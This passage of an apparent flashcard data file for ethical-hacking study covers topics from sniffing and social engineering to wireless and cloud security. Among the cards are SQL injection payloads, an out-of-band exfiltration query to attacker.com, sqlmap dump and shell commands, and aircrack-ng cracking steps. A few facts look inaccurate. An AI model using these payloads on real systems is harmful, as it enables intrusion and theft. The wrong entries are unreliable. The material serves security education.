                        { q: "Traffic analysis?", a: "Analyze patterns WITHOUT reading content; reveals frequency, volume, parties/Works even when encrypted/Wireshark statistics, Maltego, NetworkMiner" },
                        { q: "Sniffing on switched networks?", a: "Switches forward only to destination MAC (unlike hubs)/Enable: ARP Poisoning (primary), MAC Flooding (overflow CAM table→hub-like), DHCP Starvation (rogue DHCP), Port Mirroring" },
                        { q: "MAC Flooding attack?", a: "Flood CAM table with fake MACs/Overflow→'fail-open', switch acts like a hub/Broadcasts all traffic; enables sniffing" },
                        { q: "Sniffing encrypted traffic?", a: "Packets show ciphertext only/Obtain private key (server compromise), SSL Strip (HTTPS→HTTP downgrade—MitM tool), weak TLS exploits, cert pinning bypass, MitM w/ self-signed cert" }
                    ]
                },
                {
                    title: "Sniffing Basics",
                    cards: [
                        { q: "Network sniffing?", a: "Capture + analyze network traffic; legitimate troubleshooting or malicious (credential theft)" },
                        { q: "ARP poisoning?", a: "Fake ARP links attacker's MAC to a device's IP→intercept its traffic (MITM)" },
                        { q: "Common sniffing tools?", a: "Wireshark, Tcpdump (command-line), Network Monitor, Cain & Abel (cracker/sniffer), Bettercap" }
                    ]
                }
            ]
        },
        {
            id: 9,
            title: "Social Engineering",
            sections: [
                {
                    title: "Psychological Principles & Advanced Techniques",
                    cards: [
                        { q: "Psychological principles Social Engineering exploits?", a: "Authority: obey IT admin/police/Scarcity: limited availability→urgency/Urgency: time pressure stops rational thought/Familiarity/Liking: help those you like/know/Consistency: follow through on commitments/Reciprocity: return favors" },
                        { q: "PREP Framework in Social Engineering?", a: "Positioning: credibility + role/Rapport: trust + connection/Extraction: gradual info gathering/Prestige: target feels honored (ego)" },
                        { q: "Advanced phishing techniques?", a: "Spear Phishing: specific individual, personal info/Whaling: C-level execs/BizEmail/CEO Fraud: impersonate exec for wire transfers/Pharming: DNS poisoning to fake sites/Waterholing: compromise sites the group visits/Fishin (Whaling variant): large-scale org targeting/Clone Phishing: legit email resent with malicious link" },
                        { q: "Domain spoofing?", a: "Lookalike domains: microsoft.com→microsof.com (missing letter), company.com→companny.com (double letter), company.com.co (extra TLD)/Phishing emails, fake logins" },
                        { q: "QR code phishing (Quishing)?", a: "QR codes as phishing vector; URL hidden until scan/Bypasses email filters that can't scan QR/Parking tickets, event tickets, WiFi access" }
                    ]
                },
                {
                    title: "Physical SE & Prevention",
                    cards: [
                        { q: "Physical Social Engineering attacks?", a: "Tailgating/Piggybacking: follow authorized person in/Shoulder Surfing: watch password entry/Eavesdropping: listen/Dumpster Diving: trash for sensitive docs/Baiting: infected USB in parking lots/Impersonation: uniform, fake badge" },
                        { q: "Social Engineering prevention measures?", a: "Employee training + awareness (MOST IMPORTANT)/Verify sensitive requests/MFA (cuts credential-theft impact)/Security policies + procedures/Phishing simulations/Physical security (badges, mantraps)/Email filtering + DMARC/DKIM/SPF/Report suspicious activity without punishment" },
                        { q: "OSINT in Social Engineering?", a: "Public-source info: social media (LinkedIn, Facebook, Twitter), company sites, press releases, public records/Personalizes attacks, builds credibility/TheHarvester, Maltego, SpiderFoot, Recon-ng" }
                    ]
                },
                {
                    title: "Social Engineering Overview",
                    cards: [
                        { q: "Social Engineering?", a: "Psychological manipulation to make people act or disclose confidential info/Exploits authority, scarcity, urgency, familiarity, consensus" },
                        { q: "Common Social Engineering techniques?", a: "Phishing, Spear Phishing, Whaling (executives), Pretexting (fake scenarios), Baiting (enticing offers), Tailgating (physical), Quid Pro Quo (service for info)" },
                        { q: "Phishing?", a: "Fraudulent sensitive-info request disguised as trustworthy entity/Email phishing, smishing (SMS), vishing (voice), credential harvesting via fake sites" },
                        { q: "Spear phishing?", a: "Phishing at a specific individual/org; personalized with recon info→more convincing" },
                        { q: "Pretexting?", a: "Fabricated scenario to engage + extract; impersonates IT support or law enforcement" },
                        { q: "Tailgating?", a: "Follow authorized person into restricted area; often carrying items to seem entitled" },
                        { q: "Waterholing?", a: "Compromise sites the target group visits regularly; malware delivered on visit" },
                        { q: "Top 6 steps against Social Engineering?", a: "1) Training + awareness/2) Verification procedures/3) MFA/4) Security policies/5) Phishing simulations/6) Physical security" }
                    ]
                }
            ]
        },
        {
            id: 10,
            title: "Denial-of-Service",
            sections: [
                {
                    title: "DoS/DDoS Attack Types & Defense",
                    cards: [
                        { q: "Three categories of DDoS attacks?", a: "Volumetric (Bandwidth): traffic floods—UDP, ICMP, Amplification (DNS, NTP, Memcached); bits per second (bps)/Protocol (State Exhaustion): server resources—SYN floods, Ping of Death, Smurf, Fraggle; packets per second (pps)/Application Layer (L7): app resources—HTTP flood, Slowloris, RST flood, Zero-Day DDoS; requests per second (rps)" },
                        { q: "How does a SYN Flood work?", a: "Exploit TCP 3-way handshake: many SYNs, no SYN-ACK completion/Half-open connections fill table; legitimate users blocked/SYN cookies, rate limiting mitigate" },
                        { q: "Smurf attack—how it works?", a: "ICMP echoes to broadcast addresses with spoofed victim source IP/All hosts reply to victim/Amplification = number of broadcast hosts/Directed broadcast now blocked→risk lower" },
                        { q: "Ping of Death?", a: "Malformed/oversized ICMP packets (over 65,535 bytes) crash target reassembly/Patched in modern systems; still a legacy/IoT risk" },
                        { q: "Slowloris attack?", a: "Layer 7: many connections kept open with partial HTTP requests sent slowly/Connection slots fill→new connections denied/Tiny bandwidth, hard to detect" },
                        { q: "DNS Amplification?", a: "DNS queries w/ spoofed victim source IP to open resolvers; response much larger than query; 28x+ amplification/Mitigate: BCP38/BCP84, close open resolvers" },
                        { q: "DoS/DDoS attack tools (offensive)?", a: "LOIC (Low Orbit Ion Cannon): basic flood/HOIC (High Orbit Ion Cannon): LOIC + presets/Slowloris tool/MFlood: memory-efficient/GoldenEye: lightweight/Botnet-based (Mirai)/Stresser/Booter services" },
                        { q: "DDoS mitigation strategies?", a: "Rate limiting + throttling/ACL traffic filtering/Blackhole routing (RFC 3896)/CDNs (Cloudflare, Akamai)/Anycast distribution/IPS/Redundant multi-datacenter infra/AWS Shield, Cloudflare, Akamai Prolexic/ISP scrubbing centers" },
                        { q: "DoS vs DDoS?", a: "DoS: single source/DDoS: many compromised systems (botnet)/DDoS harder to block; single-source DoS often stopped by blocking one IP" },
                        { q: "Stresser/Booter service?", a: "Commercial DDoS rentals marketed as 'network testing'/Many shut down (GameOver, AfterLife)/Operate from weak cyber-law jurisdictions" }
                    ]
                },
                {
                    title: "DoS/DDoS Overview",
                    cards: [
                        { q: "DoS attack?", a: "Make machine/network unavailable by overwhelming bandwidth, CPU, memory" },
                        { q: "DDoS attack?", a: "Distributed DoS via botnet flooding target; many simultaneous sources" },
                        { q: "Common DDoS attack types?", a: "1) Volumetric (UDP floods, ICMP floods, amplification)/2) Protocol (SYN floods, Ping of Death, Smurf)/3) Application Layer (HTTP flood, Slowloris, RST flood)" },
                        { q: "SYN flood attack?", a: "Many SYNs, no handshake completion; connection table fills→blocks legit connections" },
                        { q: "Smurf attack?", a: "ICMP pings to broadcast with spoofed victim source IP; all hosts reply→victim overwhelmed" },
                        { q: "Common DoS/DDoS tools (incl. defensive)?", a: "Offensive: LOIC, HOIC, Slowloris, MFlood, botnet-based/Defensive: Cisco F5 Big-IP, Cloudflare, Akamai DDoS protection" },
                        { q: "Preventing DoS/DDoS?", a: "1) Rate limiting/2) Traffic filtering/ACLs/3) Blackhole routing/4) CDN/5) Anycast distribution/6) IPS/7) Redundant infrastructure" }
                    ]
                }
            ]
        },
        {
            id: 11,
            title: "Session Hijacking",
            sections: [
                {
                    title: "TCP Session Hijacking & Application Level",
                    cards: [
                        { q: "Session Hijacking?", a: "Take over a valid TCP session; auth only at start, so a stolen session ID authenticates/1) Track connection—sniffer + Nmap for predictable sequences/2) Desynchronize—null data/reset flag changes SEQ/ACK/3) Inject packets—inject data or join as MITM" },
                        { q: "Passive vs active session hijacking?", a: "Passive: observe/record; capture IDs/passwords without disturbing session/Active: take over live session by breaking it or joining (MITM); must guess sequence number before target responds" },
                        { q: "TCP Session Hijacking types?", a: "TCP/IP Hijacking: sniff→spoof packet w/ predicted seq→desync victim→impersonate victim/IP Spoofing (Source Routing): spoof trusted IP, inject forged packets before host responds/RST Hijacking: spoofed RST kills session/Blind: can't see responses; predict seq numbers to inject data/UDP: forged server reply to victim's UDP request (stateless)" },
                        { q: "Application Level Session Hijacking methods?", a: "Stealing: session IDs via XSS, cookies/Guessing: observe session variables/Brute force: all ID permutations/Sniffing: HTTP header cookies or body parameters" },
                        { q: "Predicting session tokens?", a: "Sequential: incrementing IDs/Timestamp-based/Small token space→brute force/Weak RNG (predictable PRNG)/No rate limiting allows rapid guessing" },
                        { q: "Man-in-the-Browser attack?", a: "Trojan loads after browser restart/Handler registered for every page visit/Extension matches URL vs targeted sites/On login extracts + modifies DOM fields/Browser sends modified values; server processes them" },
                        { q: "Cross-Site Request Forgery (CSRF)?", a: "Exploit trust in authenticated session/Victim clicks link→browser auto-includes cookies/session tokens/App doesn't verify request origin/Anti-CSRF tokens, SameSite cookies prevent it" }
                    ]
                },
                {
                    title: "Client-Side Session Attacks",
                    cards: [
                        { q: "Session Fixation?", a: "Attacker sets session ID ahead (link, cookie)/Victim logs in with known ID; ID not regenerated after auth/Regenerate session ID after login" },
                        { q: "CRIME Attack?", a: "Compression Ratio Leak Made Easy/Client-side attack on TLS/HTTP compression ratio; infer cookies from compressed sizes/SSL/TLS, SPDY, HTTPS/Disable TLS compression" },
                        { q: "FREAK / Forbidden Attack?", a: "FREAK (Factoring RSA Export Keys): downgrade to weak export crypto/Forbidden: MITM exploiting nonce reuse in TLS handshake + AES-GCM cipher exploitation/Strong ciphers, TLS hardening" },
                        { q: "Session Donation Attack?", a: "Attacker logs into shared session→victim clicks link→victim authenticates attacker's session→attacker gets victim data/Bind session to user/IP/device" }
                    ]
                },
                {
                    title: "Session Hijacking Overview",
                    cards: [
                        { q: "Types of session hijacking?", a: "1) Network hijacking (traffic interception)/2) Web session (cookie theft)/3) MITM attacks/4) XSS for cookie theft" },
                        { q: "Preventing session hijacking?", a: "1) HTTPS + secure cookies/2) Session ID rotation after login/3) Cookie flags (HttpOnly, Secure, SameSite)/4) TLS/5) CSRF tokens/6) Monitor anomalous sessions" }
                    ]
                }
            ]
        },
        {
            id: 12,
            title: "Evading IDS, Firewalls & Honeypots",
            sections: [
                {
                    title: "IDS Evasion & Firewall Bypass",
                    cards: [
                        { q: "IDS evasion techniques?", a: "Fragmentation: split packets to evade signatures/Junk Data Injection: random data before payload/Timing: slow scans under thresholds/Decoys: multiple IPs at once (Nmap -D)/OS Fingerprint Evasion/Packet Reordering" },
                        { q: "Fragmentation for IDS evasion?", a: "Split payload into small fragments—harmless alone; IDS may not reassemble before inspecting/Target reassembles + executes/Nmap -f (minimum fragmentation)" },
                        { q: "IDS evasion tools?", a: "Nmap: -f (fragment), -D (decoys), -S (spoofed IP), -g (source port)/Scapy: custom packets/Swiftenet: IDS/IPS evasion framework/P0f: OS fingerprinting w/ evasion/Fragment Scanner" },
                        { q: "Decoy scanning?", a: "Nmap -D sends from multiple fake source IPs/nmap -D decoy1,decoy2,yourIP target/IDS sees all decoys→hard to spot real scanner/Random or specified decoys" },
                        { q: "Firewall evasion techniques?", a: "IP Fragmentation: bypass inspection/Tunneling: encapsulate in allowed protocols (HTTP tunnel)/DNS Tunneling: exfiltrate via queries/IPv6 tunnel through IPv4-only FW/Blend in w/ legit ports/protocols" },
                        { q: "TCP wrapping?", a: "Malicious TCP packet inside another TCP packet; outer passes firewall, inner carries payload; bypasses stateful FWs" },
                        { q: "DNS tunneling?", a: "Encode data in DNS queries to bypass FWs/encoded-data.evil.com/DNS server relays exfiltrated data/iodine, dnscat2, dns2tcp" }
                    ]
                },
                {
                    title: "Honeypot Detection & IPS",
                    cards: [
                        { q: "Honeypot types?", a: "Decoy attracting attackers + studying behavior/Production: easy deploy, org defense/Research: complex, security research/Threat Intelligence: collect attacker TTPs" },
                        { q: "Honeypot detection methods?", a: "Unusual services (honeyd = limited implementations)/Response signatures (simplified)/Timing-analysis port scans/Duplicate MACs on multiple IPs/TCP/IP stack behavior differences" },
                        { q: "IDS vs IPS?", a: "IDS: monitors + alerts; passive, out-of-band/IPS: actively blocks malicious traffic; inline, drops packets" },
                        { q: "IPS bypass techniques?", a: "Exploit inspection blind spots/Encrypt payload/Slow attacks below thresholds/Fragment across sessions/Target app-layer vulns signatures miss" }
                    ]
                },
                {
                    title: "IDS/IPS Overview",
                    cards: [
                        { q: "IDS (Intrusion Detection System)?", a: "Monitor network/system activity for malicious acts or policy violations/NIDS (network), HIDS (host)/Signature-based vs anomaly-based" },
                        { q: "IPS (Intrusion Prevention System)?", a: "Like IDS but actively blocks in real time; drops packets, resets connections, blocks IPs" },
                        { q: "Evasion techniques (summary)?", a: "1) Fragmentation/2) Decoy scanning/3) Timing scans in normal traffic/4) Source IP spoofing/5) Tunneling (DNS, ICMP)/6) Polymorphic attacks/7) Slow scanning under thresholds" },
                        { q: "Honeypot (definition)?", a: "Decoy system to attract + study attackers/Research (academic), production (org early warning)/Low vs high interaction" }
                    ]
                }
            ]
        },
        {
            id: 13,
            title: "Hacking Web Servers",
            sections: [
                {
                    title: "Web Server Attack Vectors & Hardening",
                    cards: [
                        { q: "Web server attack vectors?", a: "Misconfigurations: default pages, directory listing, weak SSL/TLS/Outdated software with known vulns/Weak auth: default credentials/Server-side extensions: ASP, PHP, JSP vulns/CGI scripts: buffer overflows, command injection" },
                        { q: "Web server info gathering?", a: "Server type/version (curl -I, Nmap, WhatWeb)/Default + test pages/Directory listing/Virtual hosts/HTTP headers for tech stack/Nikto, DirBuster, Gobuster" },
                        { q: "Directory traversal attack (example + prevention)?", a: "Insufficient input validation→access files outside web root; ../ sequences navigate/Example: GET /../../etc/passwd/Prevent: validate + sanitize input, use chroot (OWASP Path Traversal)" },
                        { q: "Web server hardening (checklist)?", a: "Remove default/test pages/Disable directory listing/Strong SSL/TLS/Update software/Restrict HTTP methods (GET, POST, HEAD)/WAF/Security headers (X-Frame-Options, CSP, HSTS)/Regular scanning" },
                        { q: "Essential web server security headers?", a: "X-Frame-Options: DENY/SAMEORIGIN—anti-clickjacking/X-Content-Type-Options: nosniff—anti-MIME sniffing/Strict-Transport-Security (HSTS): force HTTPS/Content-Security-Policy (CSP): control resource loading/X-XSS-Protection: XSS filter/Referrer-Policy: referrer info" }
                    ]
                },
                {
                    title: "Web Server Attacks Overview",
                    cards: [
                        { q: "Common web server vulnerabilities?", a: "1) Outdated software/2) Misconfigurations/3) Default credentials/4) Directory traversal/5) Server-side includes attacks/6) CGI vulnerabilities/7) HTTP request smuggling" },
                        { q: "Directory traversal (definition)?", a: "'...' (../ or ..\\) sequences reach files outside intended root; can expose /etc/passwd, web.config, source code" },
                        { q: "Securing web servers (steps)?", a: "1) Update software/2) Disable unused services/modules/3) Strong auth/4) WAF/5) Regular audits/6) File permissions/7) Enforce HTTPS" }
                    ]
                }
            ]
        },
        {
            id: 14,
            title: "Hacking Web Applications",
            sections: [
                {
                    title: "OWASP Top 10 & XSS",
                    cards: [
                        { q: "OWASP + OWASP Top 10 (current list)?", a: "Open Web Application Security Project; industry-standard awareness document/Top 10: 1) Broken Access Control 2) Cryptographic Failures 3) Injection 4) Insecure Design 5) Security Misconfiguration 6) Vulnerable Components 7) Authentication Failures 8) Software & Data Integrity 9) Security Logging Failures 10) Server-Side Request Forgery" },
                        { q: "Injection vulnerability?", a: "Send untrusted data to an interpreter/SQLi: SQL commands via web input/Command injection: OS commands/LDAP, XML, XPath/Parameterized queries, input validation, output encoding prevent it" },
                        { q: "Broken Access Control?", a: "Users access resources/functions they shouldn't/Direct object reference (others' data), privilege escalation, vertical/horizontal bypass/Enforce access control server-side; security frameworks" },
                        { q: "XSS attack types?", a: "Reflected: malicious script via URL in response/Stored: script on server (database), served to all users/DOM-based: client-side JS modifies DOM/Different impact + prevention per type" },
                        { q: "Preventing XSS?", a: "Input validation/Output encoding (special chars: quotes, angle brackets, &)/Content-Security-Policy restricts script sources/HttpOnly cookie flag blocks document.cookie/Frameworks that auto-escape (React, Angular)" }
                    ]
                },
                {
                    title: "CSRF, Clickjacking & Web App Tools",
                    cards: [
                        { q: "CSRF attack + prevention?", a: "Force authenticated user to perform unwanted actions via active session/cookies/Anti-CSRF tokens per session/user/SameSite cookies/Custom header verification (X-Requested-With)/Re-auth for sensitive actions" },
                        { q: "Clickjacking?", a: "Trick user into clicking hidden/misleading elements/Invisible iframe overlays legit content; click triggers hidden action/X-Frame-Options DENY or SAMEORIGIN/CSP frame-ancestors directive" },
                        { q: "Web app security testing tools?", a: "OWASP ZAP: open-source web scanner/Burp Suite: manual web security toolkit/Acunetix: automated web scanner/Nikto: web server scanner/SQLmap: SQL injection tool/Wfuzz: web fuzzer/Skipfish: web app scanner/Arachni: multi-framework web scanner" }
                    ]
                },
                {
                    title: "Web App Security Overview",
                    cards: [
                        { q: "OWASP Top 10 (original list)?", a: "Standard awareness document—consensus on critical risks/Injection, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Vulnerable Components, Insufficient Logging" },
                        { q: "Cross-Site Scripting (XSS)?", a: "Inject malicious scripts into pages viewed by others/Stored (server-persisted), Reflected (URL params), DOM-based (client-side)/Steals cookies, session tokens; defaces sites" },
                        { q: "Cross-Site Request Forgery (CSRF)?", a: "Force authenticated user into unintended actions; browser sends requests with their credentials/Anti-CSRF tokens, SameSite cookies" }
                    ]
                }
            ]
        },
        {
            id: 15,
            title: "SQL Injection",
            sections: [
                {
                    title: "SQL Injection Types & Tools",
                    cards: [
                        { q: "SQL injection types (detailed)?", a: "In-band (Classic): Error-based (DB errors reveal info), Union-based (UNION SELECT combines queries)/Inferential (Blind): Boolean-based (true/false via page response), Time-based (DELAY/BENCHMARK timing diffs)/Out-of-band: DNS/HTTP exfiltration when in-band fails" },
                        { q: "UNION-based SQL Injection?", a: "UNION combines original + attacker query; match column count (find via ORDER BY)/' UNION SELECT username, password FROM users--/Data returns in same response" },
                        { q: "Blind SQL Injection?", a: "No direct data returned/Boolean: response changes on true/false—' AND 1=1 vs ' AND 1=2/Time: DB sleep functions—SQL Server WAITFOR DELAY '0:0:5', MySQL SLEEP(5), PostgreSQL pg_sleep(5)" },
                        { q: "Out-of-Band SQL Injection?", a: "Exfiltrate via different channel/DNS: SELECT LOAD_FILE(CONCAT('\\', table_name, '.attacker.com\\'))/HTTP to attacker server/Rare; needs specific DB config" },
                        { q: "SQL injection tools?", a: "SQLmap: most popular—sqlmap -u 'url?id=1' --dbs (list DBs), -D dbname --tables, -T tablename --dump/Havij: GUI (Windows)/Mantra: automated/Modlishka: phishing + SQLi" },
                        { q: "SQLmap usage?", a: "Basic: sqlmap -u 'http://target/page?id=1'/--dbs databases/-D dbname --tables tables/-D dbname -T tbl --dump data/--os-shell shell/--passwords/WAF bypass: --batch --technique=B" }
                    ]
                },
                {
                    title: "Database Exploitation & SQLi Prevention",
                    cards: [
                        { q: "After successful SQL injection?", a: "Extract usernames, passwords, PII/Bypass auth/Modify/delete data/OS commands via DB features—MySQL INTO OUTFILE, EXECUTE; SQL Server xp_cmdshell; PostgreSQL COPY FROM PROGRAM" },
                        { q: "SQL injection auth bypass?", a: "Classic: ' OR 1=1--/username field admin'--, password anything/Comments out rest→condition always true/Alt: ' OR ''='/Login forms, API endpoints, search functions" },
                        { q: "SQL injection prevention (detailed)?", a: "Parameterized queries (prepared statements)/Parameterized stored procedures/Input validation + sanitization/Least-privilege DB accounts/WAF rules/Security testing + code review/ORM frameworks/Never expose DB errors to users" },
                        { q: "Common SQL injection payloads?", a: "Auth bypass: ' OR 1=1--/UNION: ' UNION SELECT NULL,NULL,NULL--/Stacked: '; DROP TABLE users--/Comments: --, #, /*, ;*//Encoding: URL, Unicode, hex/Second-order: stored, executed later" }
                    ]
                },
                {
                    title: "SQL Injection Overview",
                    cards: [
                        { q: "SQL injection?", a: "Malicious SQL inserted into input fields to execute arbitrary commands/Bypasses auth, extracts data, modifies/deletes records, can gain server access" },
                        { q: "SQL injection types (summary)?", a: "1) In-band (Classic): UNION-based, Error-based/2) Blind (Inferential): Boolean-based, Time-based/3) Out-of-band: DNS/HTTP" },
                        { q: "'OR 1=1' injection?", a: "Always-true payload; username=' OR 1=1-- makes WHERE always true→bypasses login, returns all users" },
                        { q: "SQL injection prevention (top 6)?", a: "1) Parameterized queries (prepared statements)/2) Input validation + sanitization/3) Stored procedures/4) Least-privilege DB accounts/5) WAF/6) ORM frameworks" }
                    ]
                }
            ]
        },
        {
            id: 16,
            title: "Hacking Wireless Networks",
            sections: [
                {
                    title: "Wireless Network Attacks & Defense",
                    cards: [
                        { q: "Wireless network attack types (detailed)?", a: "Rogue APs: unauthorized APs/Evil Twin: fake AP w/ legit-looking name/WarDriving: drive to search for networks/WarChalking: mark found networks symbolically/Deauthentication: force clients off/MAC Cloning/Spoofing" },
                        { q: "Wireless encryption standards?", a: "WEP (Wired Equivalent Privacy): broken, easily cracked/WPA: WEP improvement, has weaknesses/WPA2: AES, most common (dictionary-attack vulnerable)/WPA3: SAE auth, forward secrecy/WPS: PIN vulnerability, easy crack" },
                        { q: "WPA Handshake attack?", a: "Capture 4-way handshake client + AP, then offline dictionary/brute on PSK; aircrack-ng/1) Monitor: airmon-ng start wlan0/2) Capture: airodump-ng --capture handshark.cap/3) Deauth client to force reconnect/4) Crack: aircrack-ng -w wordlist.txt handshark.cap" },
                        { q: "Evil Twin attack (mechanism + tools)?", a: "Fake AP with same SSID as legit; clients connect thinking real/Intercept all traffic, capture credentials/airbase-ng, hostapd, wifiphisher/802.1X enterprise auth, rogue AP monitoring prevent it" },
                        { q: "Rogue Access Point?", a: "Unauthorized AP on secure network; installed by employees without IT knowledge/Backdoor for attackers/WIDS detection/Network access control policies prevent it" },
                        { q: "WarDriving?", a: "Search for wireless networks while moving; laptop/phone WiFi + GPS/NetSpot, InSSIDer, Android WiFi Analyzer/Reveals open networks, WEP/WPA, hidden SSIDs, signal strength" },
                        { q: "Wireless attack tools?", a: "Aircrack-ng: monitor mode, capture, crack WEP/WPA/Kismet: wireless detector/sniffer/Reaver: WPS attacks/Fern WiFi Cracker: GUI/Bully: WPS offline/online/Cowpatty: precomputed PMKID" },
                        { q: "PMKID Attack?", a: "WPA2-Personal target; capture PMKID from first handshake message—faster than full handshake/aircrack-ng + hashcat/Needs station connected or known SSID" },
                        { q: "Securing wireless networks (full checklist)?", a: "WPA3 (or WPA2-AES)/Disable WPS/Strong PSK (12+ chars)/Hide SSID (limited effect)/MAC filtering (easily spoofed)/Firmware updates/802.1X/RADIUS enterprise auth/Guest WiFi segmentation/Wireless site surveys" },
                        { q: "Wireless Intrusion Prevention System (WIPS)?", a: "Detect + block unauthorized wireless devices; rogue APs, evil twins, deauth/spoofing/Cisco IPS, Aruba Wireless IDS/Auto-block malicious MACs" }
                    ]
                },
                {
                    title: "Wireless Network Attacks Overview",
                    cards: [
                        { q: "Common wireless attack types (list)?", a: "1) Eavesdropping/Sniffing/2) Rogue APs/3) Evil twin/4) War driving/5) Jamming/6) Deauthentication/7) WEP/WPA cracking" },
                        { q: "Evil twin attack?", a: "Fake AP mimicking legit SSID; users connect, attacker intercepts traffic + steals credentials" },
                        { q: "Securing wireless networks (top 6)?", a: "1) WPA3 (or WPA2)/2) Disable WPS/3) Hide SSID (obscurity—not sufficient alone)/4) MAC filtering/5) Firmware updates/6) 802.1X/RADIUS enterprise auth" }
                    ]
                }
            ]
        },
        {
            id: 17,
            title: "Hacking Mobile Platforms",
            sections: [
                {
                    title: "Android & iOS Security",
                    cards: [
                        { q: "Android-specific vulnerabilities?", a: "APK reverse engineering—code extraction, API keys/Insecure storage: SQLite DBs, shared preferences/Weak transport-layer encryption/Weak server-side API controls/Obfuscation bypass (ProGuard)/Malicious third-party app stores" },
                        { q: "Android App Security Testing?", a: "Static: decompile APK (apktool, jd-gui, JADX), check AndroidManifest.xml permissions, hardcoded credentials/API keys, SSL pinning/Dynamic: emulator/sandbox run, Burp Suite/mitmproxy intercept, Frida runtime manipulation" },
                        { q: "iOS-specific vulnerabilities?", a: "Jailbreaking exposes system files/Insecure storage: Keychain misuse, local DB exposure/Backup encryption disabled/SSL pinning bypass/ClassKit/Handoff vulns/iMessage exploit vectors" },
                        { q: "iOS Jailbreaking?", a: "Remove Apple restrictions/Bypass App Store controls, malware exposure, break code signing, Keychain exposure, no OTA updates/MDM policies detect it" },
                        { q: "iOS pentesting security tools?", a: "Cydia Impactor: unsigned apps/Frida: dynamic instrumentation/Objection: runtime exploration/Charles Proxy: HTTP debugging/Xcode: dev/testing/Hopper Disassembler: static analysis" }
                    ]
                },
                {
                    title: "Mobile Malware & MDM",
                    cards: [
                        { q: "Mobile malware types?", a: "Trojans: look legit, act malicious/Spyware: track location, contacts, messages/Ransomware: lock device, demand payment/Adware: unwanted ads/Rootkits: root/jailbreak access/Banking Trojans: intercept banking transactions" },
                        { q: "Mobile phishing (Smishing/Vishing)?", a: "Smishing: fake SMS w/ malicious links/Mobile email phishing for small screens/Vishing: phone calls requesting sensitive info/Quishing: malicious QR codes in messages" },
                        { q: "Mobile Device Management (MDM)?", a: "Enterprise mobile device management/Remote wipe lost/stolen/Enforce encryption + password policies/App whitelisting/blacklisting/VPN distribution/Certificate management/Jailbreak/root detection" },
                        { q: "Securing mobile devices (detailed)?", a: "Encryption (FDE/FBE)/Strong auth (biometrics + PIN)/Update OS + apps/Official app stores only/MDM/EMM, MAM/Remote wipe/Disable Bluetooth/WiFi when unused" }
                    ]
                },
                {
                    title: "Mobile Security Overview",
                    cards: [
                        { q: "Mobile security risks?", a: "1) Malicious apps (sideloading)/2) MITM attacks/3) Network sniffing/4) GPS tracking/5) Smishing/6) Jailbreak/root exploits/7) Insecure data storage" },
                        { q: "Jailbreaking?", a: "Remove iOS restrictions for unauthorized app installs; Android equivalent = rooting; raises security risks + voids warranty" },
                        { q: "Securing mobile devices (top 6)?", a: "1) Device encryption/2) Strong auth (biometrics + PIN)/3) Update OS/apps/4) Official stores only/5) MDM/6) Remote wipe" }
                    ]
                }
            ]
        },
        {
            id: 18,
            title: "IoT & OT Hacking",
            sections: [
                {
                    title: "IoT Security & Exploitation",
                    cards: [
                        { q: "IoT security challenges (device-level)?", a: "Default credentials/No communication encryption/Insecure firmware updates/No patch management/Physical tampering access/Limited resources restrict controls/Proprietary protocols" },
                        { q: "IoT vs OT?", a: "IoT: consumer/enterprise connected devices (smart home, wearables)/OT: industrial control, SCADA, PLCs/IoT=data collection, OT=physical processes/Higher safety implications when OT is compromised" },
                        { q: "Common IoT protocols?", a: "MQTT: lightweight pub/sub (Message Queuing Telemetry Transport)/CoAP: HTTP-like for constrained devices/Zigbee: low-power mesh/Z-Wave: home automation/BLE: short-range/LoRaWAN: long-range low-power WAN" },
                        { q: "Attacking IoT devices?", a: "Physical: open device, UART/USB serial console, extract firmware from flash, read config for credentials/Network: scan ports/services, default credentials, known CVEs, intercept unencrypted comms" },
                        { q: "Mirai Botnet?", a: "IoT botnet on millions of devices (cameras, routers); scanned Telnet/SSH defaults/Massive DDoS—Dyn DNS attack: 1Tbps+/Source leaked 2016" },
                        { q: "IoT security testing tools?", a: "Firmware: binwalk, firmware-mod-kit, QEMU/Hardware: Bus Pirate, JTAGulator, Raspberry Pi (serial)/Network: Wireshark, Nmap, Burp Suite/Wireless: HackRF, USRP SDR/Discovery: IoT-Scanner, Shodan" }
                    ]
                },
                {
                    title: "SCADA/ICS Security",
                    cards: [
                        { q: "SCADA/ICS vulnerabilities?", a: "Legacy systems not network-designed/Proprietary protocols w/ weak/no auth/10-20 year lifecycles without security updates/Physical safety implications/Stuxnet proved real-world damage" },
                        { q: "Common ICS/SCADA protocols?", a: "Modbus: industrial, no auth/DNP3: utilities/BACnet: building automation/PROFINET: industrial Ethernet/OPC UA: more secure/S7comm: Siemens PLCs" },
                        { q: "Securing SCADA/ICS?", a: "Segmentation (Purdue Model)/ICS firewalls (Nozomi, Claroty)/ICS IDS monitoring/Disable unused services/Physical controller security/OT incident response plans/Passive vulnerability assessments" }
                    ]
                },
                {
                    title: "IoT & OT Overview",
                    cards: [
                        { q: "IoT?", a: "Physical devices w/ sensors + connectivity to exchange data; smart home, industrial controllers, medical devices, wearables" },
                        { q: "IoT security challenges (list)?", a: "1) Weak/default passwords/2) No encryption/3) Insecure APIs/4) No auto updates/5) Limited processing power/6) Physical accessibility/7) Large attack surface" },
                        { q: "OT (Operational Technology)?", a: "Hardware + software for direct monitoring/control of physical devices, processes, events/SCADA, PLCs, ICS" },
                        { q: "Stuxnet?", a: "Sophisticated worm found 2010; targeted Iranian nuclear facilities; Siemens SCADA centrifuge disruption/First cyberweapon on physical infrastructure" }
                    ]
                }
            ]
        },
        {
            id: 19,
            title: "Cloud Computing",
            sections: [
                {
                    title: "Cloud Service Models & Vulnerabilities",
                    cards: [
                        { q: "Cloud service models (with examples)?", a: "IaaS (Infrastructure as a Service): VMs, networks, storage—AWS EC2, Azure VMs, Google Compute Engine/PaaS (Platform as a Service): dev platforms, databases—Heroku, Google App Engine, Azure Functions/SaaS (Software as a Service): complete apps—Office 365, Salesforce, Google Workspace/FaaS (Function as a Service): serverless—AWS Lambda, Azure Functions" },
                        { q: "Cloud deployment models (detailed)?", a: "Public: over public internet (AWS, Azure)/Private: dedicated for one org/Hybrid: public + private/Multi-Cloud: multiple providers at once/Community: shared by orgs w/ common requirements" },
                        { q: "Common cloud security vulnerabilities?", a: "Misconfigured storage (public S3)/Insecure APIs + endpoints/Weak IAM/Cross-account permission issues/Encryption-misconfig data exposure/Shared technology (hypervisor escapes)/Insufficient audit logs" },
